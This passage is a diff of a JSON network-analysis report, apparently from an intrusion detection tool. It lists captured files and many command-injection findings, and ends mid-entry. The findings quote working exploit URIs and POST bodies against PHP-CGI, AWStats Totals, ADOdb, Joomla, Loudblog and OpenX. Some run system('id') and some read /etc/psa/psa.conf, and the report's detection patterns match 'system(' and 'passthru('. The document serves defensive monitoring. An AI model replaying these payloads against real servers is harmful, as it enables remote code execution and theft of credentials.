+        "first_bytes_hex": "1f8b0800000000000400dcbd79771bc7b52ffafff914444707ee168a2021dbb9270d37b16ccb8e9d784a24c7ce0161af9e0034898900288a2690cffef66fefaa",
+        "truncated": false,
+        "saved_path": null
+      },
+      {
+        "sha256": "944efa92885fd681f477ab08d2baed91f419130c3950375bdff8db4a8ea4708a",
+        "ext": ".gz",
+        "size": 3797,
+        "content_type": "application/x-javascript",
+        "src_ip": "162.13.99.125",
+        "dst_ip": "192.168.0.54",
+        "uri": null,
+        "host": null,
+        "first_bytes_hex": "1f8b0800000000000400a45a6d73a34892febebf02554fa8a95519cbbd3b7bb1c835ba76cf74ec6e4c6f6f5c7b3f693413051402090106645b36badf7e4f162f",
+        "truncated": false,
+        "saved_path": null
+      },
+      {
+        "sha256": "ef2e0d58e07c0965d23c8ace84a5cab4b3057bdd7197d60375694e1ebbcd2db5",
+        "ext": ".gz",
+        "size": 322005,
+        "content_type": "application/x-gzip",
+        "src_ip": "130.236.100.79",
+        "dst_ip": "192.168.0.2",
+        "uri": "/fedora-epel/7/x86_64/repodata/ef2e0d58e07c0965d23c8ace84a5cab4b3057bdd7197d60375694e1ebbcd2db5-updateinfo.xml.gz",
+        "host": null,
+        "first_bytes_hex": "1f8b080836f2065502ff2f6d6e742f6b6f6a692f6d6173682f757064617465732f6570656c372d3135303331362e313335382f6570656c372f7838365f36342f",
+        "truncated": false,
+        "saved_path": null
+      }
+    ]
+  },
   "findings": [
     {
       "type": "dga_domain",
@@ -6714,38 +8065,6 @@
       },
       "first_seen": null,
       "last_seen": null
-    },
-    {
-      "type": "suspicious_port",
-      "value": "194.105.226.20:21",
-      "confidence": 0.5,
-      "evidence": {
-        "dst_ip": "194.105.226.20",
-        "dst_port": 21,
-        "flow_count": 1,
-        "src_ips": [
-          "192.168.0.2"
-        ],
-        "total_bytes": 686
-      },
-      "first_seen": 1426584694.524683,
-      "last_seen": 1426584694.726848
-    },
-    {
-      "type": "suspicious_port",
-      "value": "212.219.56.184:21",
-      "confidence": 0.5,
-      "evidence": {
-        "dst_ip": "212.219.56.184",
-        "dst_port": 21,
-        "flow_count": 1,
-        "src_ips": [
-          "192.168.0.2"
-        ],
-        "total_bytes": 686
-      },
-      "first_seen": 1426584694.21388,
-      "last_seen": 1426584694.37658
     },
     {
       "type": "nxdomain_burst",
@@ -7405,6 +8724,929 @@
       },
       "first_seen": 1426579955.749906,
       "last_seen": 1426580786.627749
+    },
+    {
+      "type": "command_injection",
+      "value": "54.235.163.229 → /%70%68%70%70%61%74%68/%70%68%70?%2d%64+%61%6c%6c%6f%77%5f%75%72%6c%5f%69%6e%63%6c%75%64%65%3d%6f%6e+%2d%64+%73%61%66%65%5f%6d%6f%64%65%3d%6f%66%66+%2d%64+%73%75%68%6f%73%69%6e%2e%73%69%6d%75%6c%61%74%69%6f%6e%3d%6f%6e+%2d%64+%64%69%73%61%62%6c%65%5f%66%75%6e%63%74%69%6f%6e%73%3d%22%22+%2d%64+%6f%70%65%6e%5f%62%61%73%65%64%69%72%3d%6e%6f%6e%65+%2d%64+%61%75%74%6f%5f%70%72%65%70%65%6e%64%5f%66%69%6c%65%3d%70%68%70%3a%2f%2f%69%6e%70%75%74+%2d%6e",
+      "confidence": 0.9,
+      "evidence": {
+        "src_ip": "54.235.163.229",
+        "uri": "/%70%68%70%70%61%74%68/%70%68%70?%2d%64+%61%6c%6c%6f%77%5f%75%72%6c%5f%69%6e%63%6c%75%64%65%3d%6f%6e+%2d%64+%73%61%66%65%5f%6d%6f%64%65%3d%6f%66%66+%2d%64+%73%75%68%6f%73%69%6e%2e%73%69%6d%75%6c%61%74%69%6f%6e%3d%6f%6e+%2d%64+%64%69%73%61%62%6c%65%5f%66%75%6e%63%74%69%6f%6e%73%3d%22%22+%2d%64+%6f%70%65%6e%5f%62%61%73%65%64%69%72%3d%6e%6f%6e%65+%2d%64+%61%75%74%6f%5f%70%72%65%70%65%6e%64%5f%66%69%6c%65%3d%70%68%70%3a%2f%2f%69%6e%70%75%74+%2d%6e",
+        "count": 1,
+        "matched_high": [
+          "system("
+        ],
+        "matched_medium": [],
+        "matched_patterns": [
+          "system("
+        ],
+        "methods": [
+          "POST"
+        ],
+        "hosts": [
+          "host-90-236-3-35.mobileonline.telia.com"
+        ],
+        "dst_ports": [
+          80
+        ],
+        "body_samples": [
+          "<?php echo \"Content-Type:text/html\\r\\n\\r\\n\";system(\"cat /etc/psa/psa.conf\");?>"
+        ]
+      },
+      "first_seen": null,
+      "last_seen": null
+    },
+    {
+      "type": "command_injection",
+      "value": "54.235.163.229 → /awstatstotals.php?sort=\"].passthru('id').exit().%24a[\"",
+      "confidence": 0.9,
+      "evidence": {
+        "src_ip": "54.235.163.229",
+        "uri": "/awstatstotals.php?sort=\"].passthru('id').exit().%24a[\"",
+        "count": 1,
+        "matched_high": [
+          "passthru("
+        ],
+        "matched_medium": [],
+        "matched_patterns": [
+          "passthru("
+        ],
+        "methods": [
+          "GET"
+        ],
+        "hosts": [
+          "host-90-236-3-35.mobileonline.telia.com"
+        ],
+        "dst_ports": [
+          80
+        ]
+      },
+      "first_seen": null,
+      "last_seen": null
+    },
+    {
+      "type": "command_injection",
+      "value": "54.235.163.229 → /awstatstotals.php?sort={%24{passthru(chr(105).chr(100))}}{%24{exit()}}",
+      "confidence": 0.9,
+      "evidence": {
+        "src_ip": "54.235.163.229",
+        "uri": "/awstatstotals.php?sort={%24{passthru(chr(105).chr(100))}}{%24{exit()}}",
+        "count": 1,
+        "matched_high": [
+          "passthru("
+        ],
+        "matched_medium": [],
+        "matched_patterns": [
+          "passthru("
+        ],
+        "methods": [
+          "GET"
+        ],
+        "hosts": [
+          "host-90-236-3-35.mobileonline.telia.com"
+        ],
+        "dst_ports": [
+          80
+        ]
+      },
+      "first_seen": null,
+      "last_seen": null
+    },
+    {
+      "type": "command_injection",
+      "value": "54.235.163.229 → /awstatstotals/awstatstotals.php?sort=\"].passthru('id').exit().%24a[\"",
+      "confidence": 0.9,
+      "evidence": {
+        "src_ip": "54.235.163.229",
+        "uri": "/awstatstotals/awstatstotals.php?sort=\"].passthru('id').exit().%24a[\"",
+        "count": 1,
+        "matched_high": [
+          "passthru("
+        ],
+        "matched_medium": [],
+        "matched_patterns": [
+          "passthru("
+        ],
+        "methods": [
+          "GET"
+        ],
+        "hosts": [
+          "host-90-236-3-35.mobileonline.telia.com"
+        ],
+        "dst_ports": [
+          80
+        ]
+      },
+      "first_seen": null,
+      "last_seen": null
+    },
+    {
+      "type": "command_injection",
+      "value": "54.235.163.229 → /awstatstotals/awstatstotals.php?sort={%24{passthru(chr(105).chr(100))}}{%24{exit()}}",
+      "confidence": 0.9,
+      "evidence": {
+        "src_ip": "54.235.163.229",
+        "uri": "/awstatstotals/awstatstotals.php?sort={%24{passthru(chr(105).chr(100))}}{%24{exit()}}",
+        "count": 1,
+        "matched_high": [
+          "passthru("
+        ],
+        "matched_medium": [],
+        "matched_patterns": [
+          "passthru("
+        ],
+        "methods": [
+          "GET"
+        ],
+        "hosts": [
+          "host-90-236-3-35.mobileonline.telia.com"
+        ],
+        "dst_ports": [
+          80
+        ]
+      },
+      "first_seen": null,
+      "last_seen": null
+    },
+    {
+      "type": "command_injection",
+      "value": "54.235.163.229 → /cgi-bin/awstatstotals.php?sort=\"].passthru('id').exit().%24a[\"",
+      "confidence": 0.9,
+      "evidence": {
+        "src_ip": "54.235.163.229",
+        "uri": "/cgi-bin/awstatstotals.php?sort=\"].passthru('id').exit().%24a[\"",
+        "count": 1,
+        "matched_high": [
+          "passthru("
+        ],
+        "matched_medium": [],
+        "matched_patterns": [
+          "passthru("
+        ],
+        "methods": [
+          "GET"
+        ],
+        "hosts": [
+          "host-90-236-3-35.mobileonline.telia.com"
+        ],
+        "dst_ports": [
+          80
+        ]
+      },
+      "first_seen": null,
+      "last_seen": null
+    },
+    {
+      "type": "command_injection",
+      "value": "54.235.163.229 → /cgi-bin/awstatstotals.php?sort={%24{passthru(chr(105).chr(100))}}{%24{exit()}}",
+      "confidence": 0.9,
+      "evidence": {
+        "src_ip": "54.235.163.229",
+        "uri": "/cgi-bin/awstatstotals.php?sort={%24{passthru(chr(105).chr(100))}}{%24{exit()}}",
+        "count": 1,
+        "matched_high": [
+          "passthru("
+        ],
+        "matched_medium": [],
+        "matched_patterns": [
+          "passthru("
+        ],
+        "methods": [
+          "GET"
+        ],
+        "hosts": [
+          "host-90-236-3-35.mobileonline.telia.com"
+        ],
+        "dst_ports": [
+          80
+        ]
+      },
+      "first_seen": null,
+      "last_seen": null
+    },
+    {
+      "type": "command_injection",
+      "value": "54.235.163.229 → /cgi-bin/php-cgi?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E",
+      "confidence": 0.9,
+      "evidence": {
+        "src_ip": "54.235.163.229",
+        "uri": "/cgi-bin/php-cgi?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E",
+        "count": 2,
+        "matched_high": [
+          "system("
+        ],
+        "matched_medium": [],
+        "matched_patterns": [
+          "system("
+        ],
+        "methods": [
+          "POST"
+        ],
+        "hosts": [
+          "host-90-236-3-35.mobileonline.telia.com"
+        ],
+        "dst_ports": [
+          80
+        ],
+        "body_samples": [
+          "<?php echo \"Content-Type:text/html\\r\\n\\r\\n\"; echo 'AVDS-695915245'; system('id'); die; ?>",
+          "<?php echo \"Content-Type:text/html\\r\\n\\r\\n\"; echo 'AVDS-695915245'; system('ipconfig /all'); die; ?>"
+        ]
+      },
+      "first_seen": null,
+      "last_seen": null
+    },
+    {
+      "type": "command_injection",
+      "value": "54.235.163.229 → /cgi-bin/php.cgi?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E",
+      "confidence": 0.9,
+      "evidence": {
+        "src_ip": "54.235.163.229",
+        "uri": "/cgi-bin/php.cgi?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E",
+        "count": 2,
+        "matched_high": [
+          "system("
+        ],
+        "matched_medium": [],
+        "matched_patterns": [
+          "system("
+        ],
+        "methods": [
+          "POST"
+        ],
+        "hosts": [
+          "host-90-236-3-35.mobileonline.telia.com"
+        ],
+        "dst_ports": [
+          80
+        ],
+        "body_samples": [
+          "<?php echo \"Content-Type:text/html\\r\\n\\r\\n\"; echo 'AVDS-992536529'; system('id'); die; ?>",
+          "<?php echo \"Content-Type:text/html\\r\\n\\r\\n\"; echo 'AVDS-992536529'; system('ipconfig /all'); die; ?>"
+        ]
+      },
+      "first_seen": null,
+      "last_seen": null
+    },
+    {
+      "type": "command_injection",
+      "value": "54.235.163.229 → /cgi-bin/php4?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E",
+      "confidence": 0.9,
+      "evidence": {
+        "src_ip": "54.235.163.229",
+        "uri": "/cgi-bin/php4?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E",
+        "count": 2,
+        "matched_high": [
+          "system("
+        ],
+        "matched_medium": [],
+        "matched_patterns": [
+          "system("
+        ],
+        "methods": [
+          "POST"
+        ],
+        "hosts": [
+          "host-90-236-3-35.mobileonline.telia.com"
+        ],
+        "dst_ports": [
+          80
+        ],
+        "body_samples": [
+          "<?php echo \"Content-Type:text/html\\r\\n\\r\\n\"; echo 'AVDS-1967432519'; system('id'); die; ?>",
+          "<?php echo \"Content-Type:text/html\\r\\n\\r\\n\"; echo 'AVDS-1967432519'; system('ipconfig /all'); die; ?>"
+        ]
+      },
+      "first_seen": null,
+      "last_seen": null
+    },
+    {
+      "type": "command_injection",
+      "value": "54.235.163.229 → /cgi-bin/php5?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E",
+      "confidence": 0.9,
+      "evidence": {
+        "src_ip": "54.235.163.229",
+        "uri": "/cgi-bin/php5?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E",
+        "count": 2,
+        "matched_high": [
+          "system("
+        ],
+        "matched_medium": [],
+        "matched_patterns": [
+          "system("
+        ],
+        "methods": [
+          "POST"
+        ],
+        "hosts": [
+          "host-90-236-3-35.mobileonline.telia.com"
+        ],
+        "dst_ports": [
+          80
+        ],
+        "body_samples": [
+          "<?php echo \"Content-Type:text/html\\r\\n\\r\\n\"; echo 'AVDS-524536573'; system('id'); die; ?>",
+          "<?php echo \"Content-Type:text/html\\r\\n\\r\\n\"; echo 'AVDS-524536573'; system('ipconfig /all'); die; ?>"
+        ]
+      },
+      "first_seen": null,
+      "last_seen": null
+    },
+    {
+      "type": "command_injection",
+      "value": "54.235.163.229 → /cgi-bin/php?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E",
+      "confidence": 0.9,
+      "evidence": {
+        "src_ip": "54.235.163.229",
+        "uri": "/cgi-bin/php?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E",
+        "count": 2,
+        "matched_high": [
+          "system("
+        ],
+        "matched_medium": [],
+        "matched_patterns": [
+          "system("
+        ],
+        "methods": [
+          "POST"
+        ],
+        "hosts": [
+          "host-90-236-3-35.mobileonline.telia.com"
+        ],
+        "dst_ports": [
+          80
+        ],
+        "body_samples": [
+          "<?php echo \"Content-Type:text/html\\r\\n\\r\\n\"; echo 'AVDS-118431100'; system('id'); die; ?>",
+          "<?php echo \"Content-Type:text/html\\r\\n\\r\\n\"; echo 'AVDS-118431100'; system('ipconfig /all'); die; ?>"
+        ]
+      },
+      "first_seen": null,
+      "last_seen": null
+    },
+    {
+      "type": "command_injection",
+      "value": "54.235.163.229 → /index.php?-d+allow_url_include%3don+-d+safe_mode%3doff+-d+suhosin.simulation%3don+-d+open_basedir%3doff+-d+auto_prepend_file%3dphp%3a//input+-n",
+      "confidence": 0.9,
+      "evidence": {
+        "src_ip": "54.235.163.229",
+        "uri": "/index.php?-d+allow_url_include%3don+-d+safe_mode%3doff+-d+suhosin.simulation%3don+-d+open_basedir%3doff+-d+auto_prepend_file%3dphp%3a//input+-n",
+        "count": 2,
+        "matched_high": [
+          "system("
+        ],
+        "matched_medium": [],
+        "matched_patterns": [
+          "system("
+        ],
+        "methods": [
+          "POST"
+        ],
+        "hosts": [
+          "host-90-236-3-35.mobileonline.telia.com"
+        ],
+        "dst_ports": [
+          80
+        ],
+        "body_samples": [
+          "<?php echo 'AVDS-231099080'; system('id'); die; ?>",
+          "<?php echo 'AVDS-231099080'; system('ipconfig /all'); die; ?>"
+        ]
+      },
+      "first_seen": null,
+      "last_seen": null
+    },
+    {
+      "type": "command_injection",
+      "value": "54.235.163.229 → /scripts/adodb-perf-module.inc.php?last_module=zZz_ADOConnection%7b%7dsystem(id)%3bclass%20zZz_ADOConnection%7b%7d%2f%2f",
+      "confidence": 0.9,
+      "evidence": {
+        "src_ip": "54.235.163.229",
+        "uri": "/scripts/adodb-perf-module.inc.php?last_module=zZz_ADOConnection%7b%7dsystem(id)%3bclass%20zZz_ADOConnection%7b%7d%2f%2f",
+        "count": 1,
+        "matched_high": [
+          "system("
+        ],
+        "matched_medium": [],
+        "matched_patterns": [
+          "system("
+        ],
+        "methods": [
+          "GET"
+        ],
+        "hosts": [
+          "host-90-236-3-35.mobileonline.telia.com"
+        ],
+        "dst_ports": [
+          80
+        ]
+      },
+      "first_seen": null,
+      "last_seen": null
+    },
+    {
+      "type": "command_injection",
+      "value": "54.235.163.229 → /scripts/awstatstotals.php?sort=\"].passthru('id').exit().%24a[\"",
+      "confidence": 0.9,
+      "evidence": {
+        "src_ip": "54.235.163.229",
+        "uri": "/scripts/awstatstotals.php?sort=\"].passthru('id').exit().%24a[\"",
+        "count": 1,
+        "matched_high": [
+          "passthru("
+        ],
+        "matched_medium": [],
+        "matched_patterns": [
+          "passthru("
+        ],
+        "methods": [
+          "GET"
+        ],
+        "hosts": [
+          "host-90-236-3-35.mobileonline.telia.com"
+        ],
+        "dst_ports": [
+          80
+        ]
+      },
+      "first_seen": null,
+      "last_seen": null
+    },
+    {
+      "type": "command_injection",
+      "value": "54.235.163.229 → /scripts/awstatstotals.php?sort={%24{passthru(chr(105).chr(100))}}{%24{exit()}}",
+      "confidence": 0.9,
+      "evidence": {
+        "src_ip": "54.235.163.229",
+        "uri": "/scripts/awstatstotals.php?sort={%24{passthru(chr(105).chr(100))}}{%24{exit()}}",
+        "count": 1,
+        "matched_high": [
+          "passthru("
+        ],
+        "matched_medium": [],
+        "matched_patterns": [
+          "passthru("
+        ],
+        "methods": [
+          "GET"
+        ],
+        "hosts": [
+          "host-90-236-3-35.mobileonline.telia.com"
+        ],
+        "dst_ports": [
+          80
+        ]
+      },
+      "first_seen": null,
+      "last_seen": null
+    },
+    {
+      "type": "command_injection",
+      "value": "54.235.163.229 → /scripts/hw3.php?daysonly=0).system(id).(",
+      "confidence": 0.9,
+      "evidence": {
+        "src_ip": "54.235.163.229",
+        "uri": "/scripts/hw3.php?daysonly=0).system(id).(",
+        "count": 1,
+        "matched_high": [
+          "system("
+        ],
+        "matched_medium": [],
+        "matched_patterns": [
+          "system("
+        ],
+        "methods": [
+          "GET"
+        ],
+        "hosts": [
+          "host-90-236-3-35.mobileonline.telia.com"
+        ],
+        "dst_ports": [
+          80
+        ]
+      },
+      "first_seen": null,
+      "last_seen": null
+    },
+    {
+      "type": "command_injection",
+      "value": "54.235.163.229 → /scripts/index.php?option=frontpage&Itemid=2|system(id)|1159710468",
+      "confidence": 0.9,
+      "evidence": {
+        "src_ip": "54.235.163.229",
+        "uri": "/scripts/index.php?option=frontpage&Itemid=2|system(id)|1159710468",
+        "count": 1,
+        "matched_high": [
+          "system("
+        ],
+        "matched_medium": [],
+        "matched_patterns": [
+          "system("
+        ],
+        "methods": [
+          "GET"
+        ],
+        "hosts": [
+          "host-90-236-3-35.mobileonline.telia.com"
+        ],
+        "dst_ports": [
+          80
+        ]
+      },
+      "first_seen": null,
+      "last_seen": null
+    },
+    {
+      "type": "command_injection",
+      "value": "54.235.163.229 → /scripts/index2.php?_SERVER[]=&_SERVER[REMOTE_ADDR]='.system('id').exit().'&option=wrapper&module[module]=1",
+      "confidence": 0.9,
+      "evidence": {
+        "src_ip": "54.235.163.229",
+        "uri": "/scripts/index2.php?_SERVER[]=&_SERVER[REMOTE_ADDR]='.system('id').exit().'&option=wrapper&module[module]=1",
+        "count": 1,
+        "matched_high": [
+          "system("
+        ],
+        "matched_medium": [],
+        "matched_patterns": [
+          "system("
+        ],
+        "methods": [
+          "GET"
+        ],
+        "hosts": [
+          "host-90-236-3-35.mobileonline.telia.com"
+        ],
+        "dst_ports": [
+          80
+        ]
+      },
+      "first_seen": null,
+      "last_seen": null
+    },
+    {
+      "type": "command_injection",
+      "value": "54.235.163.229 → /scripts/login.pl?login=automatedscanning&script=-e%20print%20%22Content-Type%3a%20text%2fplain%0d%0a%0d%0a%22%3bsystem(id)&action=logout",
+      "confidence": 0.9,
+      "evidence": {
+        "src_ip": "54.235.163.229",
+        "uri": "/scripts/login.pl?login=automatedscanning&script=-e%20print%20%22Content-Type%3a%20text%2fplain%0d%0a%0d%0a%22%3bsystem(id)&action=logout",
+        "count": 1,
+        "matched_high": [
+          "system("
+        ],
+        "matched_medium": [],
+        "matched_patterns": [
+          "system("
+        ],
+        "methods": [
+          "GET"
+        ],
+        "hosts": [
+          "host-90-236-3-35.mobileonline.telia.com"
+        ],
+        "dst_ports": [
+          80
+        ]
+      },
+      "first_seen": null,
+      "last_seen": null
+    },
+    {
+      "type": "command_injection",
+      "value": "54.235.163.229 → /scripts/loudblog/inc/parse_old.php?template=@system(id);@&php_use=1&phpseparator=@",
+      "confidence": 0.9,
+      "evidence": {
+        "src_ip": "54.235.163.229",
+        "uri": "/scripts/loudblog/inc/parse_old.php?template=@system(id);@&php_use=1&phpseparator=@",
+        "count": 1,
+        "matched_high": [
+          "system("
+        ],
+        "matched_medium": [],
+        "matched_patterns": [
+          "system("
+        ],
+        "methods": [
+          "GET"
+        ],
+        "hosts": [
+          "host-90-236-3-35.mobileonline.telia.com"
+        ],
+        "dst_ports": [
+          80
+        ]
+      },
+      "first_seen": null,
+      "last_seen": null
+    },
+    {
+      "type": "command_injection",
+      "value": "54.235.163.229 → /scripts/www/delivery/ac.php?bannerid=-1455588347+OR+1=1+--+';passthru(base64_decode($_SERVER[HTTP_AVDS_BTQCQPZS]));die;/*",
+      "confidence": 0.9,
+      "evidence": {
+        "src_ip": "54.235.163.229",
+        "uri": "/scripts/www/delivery/ac.php?bannerid=-1455588347+OR+1=1+--+';passthru(base64_decode($_SERVER[HTTP_AVDS_BTQCQPZS]));die;/*",
+        "count": 1,
+        "matched_high": [
+          "passthru("
+        ],
+        "matched_medium": [],
+        "matched_patterns": [
+          "passthru("
+        ],
+        "methods": [
+          "GET"
+        ],
+        "hosts": [
+          "host-90-236-3-35.mobileonline.telia.com"
+        ],
+        "dst_ports": [
+          80
+        ]
+      },
+      "first_seen": null,
+      "last_seen": null
+    },
+    {
+      "type": "command_injection",
+      "value": "54.235.163.229 → /stat/awstatstotals.php?sort=\"].passthru('id').exit().%24a[\"",
+      "confidence": 0.9,
+      "evidence": {
+        "src_ip": "54.235.163.229",
+        "uri": "/stat/awstatstotals.php?sort=\"].passthru('id').exit().%24a[\"",
+        "count": 1,
+        "matched_high": [
+          "passthru("
+        ],
+        "matched_medium": [],
+        "matched_patterns": [
+          "passthru("
+        ],
+        "methods": [
+          "GET"
+        ],
+        "hosts": [
+          "host-90-236-3-35.mobileonline.telia.com"
+        ],
+        "dst_ports": [
+          80
+        ]
+      },
+      "first_seen": null,
+      "last_seen": null
+    },
+    {
